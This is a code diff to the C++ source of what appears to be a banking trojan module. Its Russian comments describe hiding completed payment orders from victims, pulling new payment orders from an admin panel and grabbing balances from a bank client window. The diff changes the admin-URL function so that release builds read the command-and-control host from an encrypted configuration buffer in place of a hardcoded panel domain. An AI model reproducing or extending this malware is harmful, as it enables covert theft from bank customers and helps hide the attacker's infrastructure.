@@ -12,6 +12,7 @@
 #include "commctrl.h"
 #include "BotDebug.h"
 #include "BotHTTP.h"
+#include "Config.h"
 
 namespace DBGRAFADLL
 {
@@ -88,6 +89,7 @@ static void GrabBalansFromLVM( int cln, const char* s );
 static void LoadPaymentOrders(); //загрузка проведенных платежек из файла, чтобы их потом скрывать
 static void SavePaymentOrders(); //сохранение платежек
 static PaymentOrder* GetPaymentOrders(); //запрос новой платежки в админке
+static char* GetAdminUrl( char* url );
 
 HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
 DWORD PID = 0; //для избежания 2-го запуска
@@ -1258,7 +1260,15 @@ const char* panelaz = "az.gipa.in"; //"sberbanksystem.ru";
 
 static char* GetAdminUrl( char* url )
 {
+#ifdef DEBUGCONFIG
 	m_lstrcpy( url, panelaz );
+#else
+	string host = GetActiveHostFromBuf2( RAFA_HOSTS, 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
+	if( !host.IsEmpty() )
+		m_lstrcpy( url, host.t_str() );
+	else
+		url = 0;
+#endif
 	return url;
 }
 
